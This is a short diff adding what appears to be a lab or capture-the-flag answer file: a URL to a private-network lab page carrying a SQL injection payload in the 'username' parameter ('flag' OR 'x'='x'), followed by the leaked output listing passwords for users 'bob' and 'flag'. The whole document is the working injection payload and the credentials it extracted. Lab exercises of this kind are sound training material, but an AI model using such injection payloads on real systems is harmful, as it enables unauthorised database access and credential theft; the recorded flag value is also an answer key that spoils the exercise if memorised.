@@ -1,0 +1,6 @@
+http://192.168.14.50/lab05/prob08/search.php?username=flag' OR 'x'='x
+
+
+Password for bob is password
+Password for flag is 2bd4637ce695928f
+
